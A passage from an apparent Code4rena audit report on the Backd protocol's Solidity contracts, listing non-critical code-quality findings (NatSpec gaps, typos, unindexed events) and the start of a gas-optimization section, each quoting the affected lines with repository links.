0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L2  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L2  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L2  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L2  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L2  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L2  ```solidity File: protocol/contracts/access/RoleManager.sol  2:    pragma solidity 0.8.10; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L2  ### 7. Constant redefined elsewhere Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.  *There are 10 instances of this issue:* ```solidity File: protocol/contracts/Controller.sol  /// @audit seen in protocol/contracts/StakerVault.sol  21:       IAddressProvider public immutable override addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L21  ```solidity File: protocol/contracts/RewardHandler.sol  /// @audit seen in protocol/contracts/StakerVault.sol  20:       IController public immutable controller;  /// @audit seen in protocol/contracts/Controller.sol  21:       IAddressProvider public immutable addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L20  ```solidity File: protocol/contracts/tokenomics/Minter.sol  /// @audit seen in protocol/contracts/RewardHandler.sol  55:       IController public immutable controller; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L55  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit seen in protocol/contracts/RewardHandler.sol  24:       IAddressProvider public immutable addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L24  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  /// @audit seen in protocol/contracts/tokenomics/Minter.sol  20:       IController public immutable controller; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L20  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit seen in protocol/contracts/tokenomics/AmmGauge.sol  30:       IController public immutable controller; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L30  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  /// @audit seen in protocol/contracts/tokenomics/KeeperGauge.sol  19:       IController public immutable controller;  /// @audit seen in protocol/contracts/StakerVault.sol  21:       IInflationManager public immutable inflationManager; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L19  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit seen in protocol/contracts/tokenomics/InflationManager.sol  25:       IAddressProvider public immutable addressProvider; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L25  ### 8. Inconsistent spacing in comments Some lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #1  11:       uint256 private constant _CLIFF_COUNT = 1000; // 1,000 cliffs ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L11  ```solidity File: protocol/contracts/utils/CvxMintAmount.sol   #2  14:           IERC20(address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B)); // CVX Token ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol#L14  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #3  532:      //TOOD: See if this is still needed somewhere ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532  ### 9. File is missing NatSpec  *There are 5 instances of this issue:* ```solidity File: protocol/contracts/utils/CvxMintAmount.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/CvxMintAmount.sol  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol  ```solidity File: protocol/contracts/access/Authorization.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/Authorization.sol  ```solidity File: protocol/contracts/access/RoleManager.sol  ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol  ### 10. NatSpec is incomplete  *There are 17 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  /// @audit Missing: '@param strategy' 93        /** 94         * @notice Registers an address as a strategy to be excluded from token accumulation. 95         * @dev This should be used if a strategy deposits into a stakerVault and should not get gov. tokens. 96         * @return `true` if success. 97         */ 98:       function addStrategy(address strategy) external override returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L93-L98  ```solidity File: protocol/contracts/Controller.sol  /// @audit Missing: '@param payer' 117       /** 118        * @return the total amount of ETH require by `payer` to cover the fees for 119        * positions registered in all actions 120        */ 121:      function getTotalEthRequiredForGas(address payer) external view override returns (uint256) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L117-L121  ```solidity File: protocol/contracts/utils/Preparable.sol  /// @audit Missing: '@param key' 33        /** 34         * @notice Prepares an uint256 that should be committed to the contract 35         * after `_MIN_DELAY` elapsed 36         * @param value The value to prepare 37         * @return `true` if success. 38         */ 39        function _prepare( 40            bytes32 key, 41            uint256 value, 42            uint256 delay 43:       ) internal returns (bool) {  /// @audit Missing: '@param delay' 33        /** 34         * @notice Prepares an uint256 that should be committed to the contract 35         * after `_MIN_DELAY` elapsed 36         * @param value The value to prepare 37         * @return `true` if success. 38         */ 39        function _prepare( 40            bytes32 key, 41            uint256 value, 42            uint256 delay 43:       ) internal returns (bool) {  /// @audit Missing: '@param key' 57        /** 58         * @notice Prepares an address that should be committed to the contract 59         * after `_MIN_DELAY` elapsed 60         * @param value The value to prepare 61         * @return `true` if success. 62         */ 63        function _prepare( 64            bytes32 key, 65            address value, 66            uint256 delay 67:       ) internal returns (bool) {  /// @audit Missing: '@param delay' 57        /** 58         * @notice Prepares an address that should be committed to the contract 59         * after `_MIN_DELAY` elapsed 60         * @param value The value to prepare 61         * @return `true` if success. 62         */ 63        function _prepare( 64            bytes32 key, 65            address value, 66            uint256 delay 67:       ) internal returns (bool) {  /// @audit Missing: '@param key' 81        /** 82         * @notice Reset a uint256 key 83         * @return `true` if success. 84         */ 85:       function _resetUInt256Config(bytes32 key) internal returns (bool) {  /// @audit Missing: '@param key' 93        /** 94         * @notice Reset an address key 95         * @return `true` if success. 96         */ 97:       function _resetAddressConfig(bytes32 key) internal returns (bool) {  /// @audit Missing: '@param key' 115       /** 116        * @notice Execute uint256 config update (with time delay enforced). 117        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 118        * @return New value. 119        */ 120:      function _executeUInt256(bytes32 key) internal returns (uint256) {  /// @audit Missing: '@param key' 127       /** 128        * @notice Execute address config update (with time delay enforced). 129        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 130        * @return New value. 131        */ 132:      function _executeAddress(bytes32 key) internal returns (address) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L33-L43  ```solidity File: protocol/contracts/AddressProvider.sol  /// @audit Missing: '@return' 79         * @param action Address of action to add. 80         */ 81:       function addAction(address action) external override onlyGovernance returns (bool) {  /// @audit Missing: '@param freezable' 207       /** 208        * @notice Initializes an address 209        * @param key Key to initialize 210        * @param initialAddress Address for `key` 211        */ 212       function initializeAddress( 213           bytes32 key, 214           address initialAddress, 215           bool freezable 216:      ) public override onlyGovernance {  /// @audit Missing: '@param key' 264       /** 265        * @notice Execute update of `key` 266        * @return New address. 267        */ 268:      function executeAddress(bytes32 key) external override returns (address) {  /// @audit Missing: '@param key' 274       /** 275        * @notice Reset `key` 276        * @return true if it was reset 277        */ 278:      function resetAddress(bytes32 key) external override onlyGovernance returns (bool) {  /// @audit Missing: '@param token' 396       /** 397        * @notice Tries to get the staker vault for a given token but does not throw if it does not exist 398        * @return A boolean set to true if the vault exists and the vault address. 399        */ 400:      function tryGetStakerVault(address token) external view override returns (bool, address) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L79-L81  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit Missing: '@param lpToken' 236       /** 237        * @notice Execute update of lp pool weight (with time delay enforced). 238        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 239        * @return New lp pool weight. 240        */ 241:      function executeLpPoolWeight(address lpToken) external override returns (uint256) {  /// @audit Missing: '@param token' 321       /** 322        * @notice Execute update of lp pool weight (with time delay enforced). 323        * @dev Needs to be called after the update was prepared. Fails if called before time delay is met. 324        * @return New lp pool weight. 325        */ 326:      function executeAmmTokenWeight(address token) external override returns (uint256) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L236-L241  ### 11. Event is missing `indexed` fields Each `event` should use three `indexed` fields if there are three or more fields  *There are 10 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  18:       event Migrated(address user, address oldPool, address newPool, uint256 lpTokenAmount); // Emitted when a migration is completed ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L18  ```solidity File: protocol/contracts/tokenomics/Minter.sol  58:       event TokensMinted(address beneficiary, uint256 amount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L58  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  43:       event NewKeeperWeight(address indexed pool, uint256 newWeight);  44:       event NewLpWeight(address indexed pool, uint256 newWeight);  45:       event NewAmmTokenWeight(address indexed token, uint256 newWeight); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L43  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  34:       event Revoked(address indexed user, uint256 revokedAmount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L34  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  34:       event RewardClaimed(address indexed account, uint256 amount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L34  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  48:       event Fund(address indexed recipient, uint256 reward);  49:       event Claim(address indexed user, uint256 amount); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L48  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  29:       event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L29  ### 12. Not using the named return variables anywhere in the function is confusing Consider changing the variable to be an unnamed one  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #1  /// @audit received 43        function burnToTarget(address[] memory tokens_, address targetLpToken_) 44            public 45            payable 46            override 47:           returns (uint256 received) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43-L47  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #2  /// @audit received 96        function _depositInPool(address underlying_, ILiquidityPool pool_) 97            internal 98:           returns (uint256 received) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L96-L98  ### 13. Typos  *There are 6 instances of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol  /// @audit invlude 173:       * @dev This does not invlude the gov. tokens queued for withdrawal. ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit TOOD 532:      //TOOD: See if this is still needed somewhere ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L532  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  /// @audit Emmited 29:       event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token  /// @audit successfull 29:       event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token  /// @audit Recieve 35:       receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool  /// @audit Transfering 84:           // Transfering LP tokens back to sender ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L29 
## Summary  ### Gas Optimizations | |Issue|Instances| |-|:-|:-:| | 1 | Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate | 5 | | 2 | State variables only set in the constructor should be declared `immutable` | 1 | | 3 | State variables can be packed into fewer storage slots | 2 | | 4 | State variables should be cached in stack variables rather than re-reading them from storage | 32 | | 5 | Multiple accesses of a mapping/array should use a local variable cache | 7 | | 6 | The result of external function calls should be cached rather than re-calling the function | 2 | | 7 | `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables | 14 | | 8 | `internal` functions only called once can be inlined to save gas | 6 | | 9 | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` | 1 | | 10 | `<array>.length` should not be looked up in every loop of a `for`-loop | 8 | | 11 | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 1 | | 12 | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 1 | | 13 | Using `bool`s for storage incurs overhead | 7 | | 14 | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 7 | | 15 | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 3 | | 16 | Using `private` rather than `public` for constants, saves gas | 11 | | 17 | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 7 | | 18 | `require()` or `revert()` statements that check input arguments should be at the top of the function | 3 | | 19 | Empty blocks should be removed or emit something | 3 | | 20 | Use custom errors rather than `revert()`/`require()` strings to save deployment gas | 109 | | 21 | Functions guaranteed to revert when called by normal users can be marked `payable` | 53 |  Total: 283 instances over 21 issues   ## Gas Optimizations  ### 1. Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - **30 gas**) and that calculation's associated stack operations.  *There are 5 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  50        mapping(address => uint256) public balances; 51        mapping(address => uint256) public actionLockedBalances; 52     53:       mapping(address => mapping(address => uint256)) internal _allowances; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L50-L53  ```solidity File: protocol/contracts/BkdLocker.sol  27        mapping(address => uint256) public balances; 28        mapping(address => uint256) public boostFactors; 29        mapping(address => uint256) public lastUpdated; 30        mapping(address => WithdrawStash[]) public stashedGovTokens; 31:       mapping(address => uint256) public totalStashed; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L27-L31  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  27        mapping(address => uint256) public perUserStakedIntegral; 28:       mapping(address => uint256) public perUserShare; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L27-L28  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  44        mapping(address => uint256) public initialLocked; 45        mapping(address => uint256) public totalClaimed; 46:       mapping(address => address) public holdingContract; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L44-L46  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  25        mapping(address => uint256) public perUserStakedIntegral; 26:       mapping(address => uint256) public perUserShare; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L25-L26  ### 2. State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces each Gwarmacces (**100 gas**) with a `PUSH32` (**3 gas**).  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  39:       uint256 public totalTime; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L39  ### 3. State variables can be packed into fewer storage slots If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  /// @audit Variable ordering with 8 slots instead of the current 9: /// @audit  uint256(32):totalTime, uint256(32):initialLockedSupply, uint256(32):unallocatedSupply, mapping(32):initialLocked, mapping(32):totalClaimed, mapping(32):holdingContract, address(20):admin, bool(1):initializedSupply, address(20):fundAdmin 34:       address public admin; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L34  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol   #2  /// @audit Variable ordering with 5 slots instead of the current 6: /// @audit  mapping(32):keeperRecords, mapping(32):perPeriodTotalFees, uint256(32):epoch, mapping(32):perPeriodTotalInflation, uint48(6):lastUpdated, bool(1):killed 27:       mapping(address => KeeperRecord) public keeperRecords; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L27  ### 4. State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 32 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  /// @audit token 330:          uint256 oldBal = IERC20(token).balanceOf(address(this));  /// @audit token 333:              ILiquidityPool pool = addressProvider.getPoolForToken(token);  /// @audit token 337:          IERC20(token).safeTransferFrom(msg.sender, address(this), amount);  /// @audit token 338:          uint256 staked = IERC20(token).balanceOf(address(this)) - oldBal;  /// @audit token 375:          uint256 oldBal = IERC20(token).balanceOf(address(this));  /// @audit token 381:          IERC20(token).safeTransfer(dst, amount);  /// @audit token 383:          uint256 unstaked = oldBal.uncheckedSub(IERC20(token).balanceOf(address(this))); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L330  ```solidity File: protocol/contracts/BkdLocker.sol  /// @audit totalLockedBoosted 97:           curRewardTokenData.feeIntegral += amount.scaledDiv(totalLockedBoosted); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L97  ```solidity File: protocol/contracts/tokenomics/Minter.sol  /// @audit currentInflationAmountLp 91:               currentInflationAmountLp +  /// @audit currentInflationAmountLp 208:                  currentInflationAmountLp +  /// @audit currentInflationAmountKeeper 92:               currentInflationAmountKeeper +  /// @audit currentInflationAmountKeeper 209:                  currentInflationAmountKeeper +  /// @audit currentInflationAmountAmm 93:               currentInflationAmountAmm;  /// @audit currentInflationAmountAmm 210:                  currentInflationAmountAmm;  /// @audit totalAvailableToNow 220:          require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L91  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit minter 501:          uint256 lpInflationRate = Minter(minter).getLpInflationRate();  /// @audit minter 511:          uint256 keeperInflationRate = Minter(minter).getKeeperInflationRate();  /// @audit minter 526:          uint256 ammInflationRate = Minter(minter).getAmmInflationRate();  /// @audit totalKeeperPoolWeight 517:              totalKeeperPoolWeight;  /// @audit totalKeeperPoolWeight 575:          totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  /// @audit totalLpPoolWeight 502:          uint256 poolInflationRate = (currentUInts256[key] * lpInflationRate) / totalLpPoolWeight;  /// @audit totalLpPoolWeight 589:          totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  /// @audit totalAmmTokenWeight 528:              totalAmmTokenWeight;  /// @audit totalAmmTokenWeight 602:          totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L501  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  /// @audit ammStakedIntegral 159:          perUserStakedIntegral[user] = ammStakedIntegral;  /// @audit totalStaked 90:                   (block.timestamp - uint256(ammLastUpdated))).scaledDiv(totalStaked);  /// @audit totalStaked 148:              ammStakedIntegral += (currentRate * timeElapsed).scaledDiv(totalStaked); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L159  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  /// @audit unallocatedSupply 84:           require(unallocatedSupply > 0, "No reward tokens in contract"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit epoch 87:           keeperRecords[beneficiary].feesInPeriod[epoch] += amount;  /// @audit epoch 88:           perPeriodTotalFees[epoch] += amount;  /// @audit epoch 131:              endEpoch = epoch; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L87  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit _roles[role].members 148:          return _roles[role].members[account]; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L148  ### 5. Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol  /// @audit stashedWithdraws[i] 142:                  totalAvailableToWithdraw += stashedWithdraws[i].amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L142  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  /// @audit amounts[i] 96:               address recipient_ = amounts[i].recipient; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L96  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit keeperRecords[beneficiary] 84:               keeperRecords[beneficiary].firstEpochSet = true;  /// @audit keeperRecords[beneficiary] 85:               keeperRecords[beneficiary].nextEpochToClaim = epoch;  /// @audit keeperRecords[beneficiary] 87:           keeperRecords[beneficiary].feesInPeriod[epoch] += amount;  /// @audit keeperRecords[beneficiary] 139:          keeperRecords[beneficiary].nextEpochToClaim = endEpoch; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L84  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit _roles[role] 148:          return _roles[role].members[account]; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L148  ### 6. The result of external function calls should be cached rather than re-calling the function The instances below point to the second+ call of the function within a single function  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol   #1  /// @audit _controller.addressProvider() 62:           Authorization(_controller.addressProvider().getRoleManager()) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L62  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #2  /// @audit i.uncheckedInc() 121:          for (uint256 i; i < length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L121  ### 7. `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables  *There are 14 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  343:              strategiesTotalStaked += staked;  345:              _poolTotalStaked += staked;  392:              strategiesTotalStaked -= unstaked;  394:              _poolTotalStaked -= unstaked; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L343  ```solidity File: protocol/contracts/BkdLocker.sol  152:          totalLocked -= totalAvailableToWithdraw;  230:          totalLocked += amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L152  ```solidity File: protocol/contracts/tokenomics/Minter.sol  154:          issuedNonInflationSupply += amount;  188:          totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));  218:          totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation); ``` 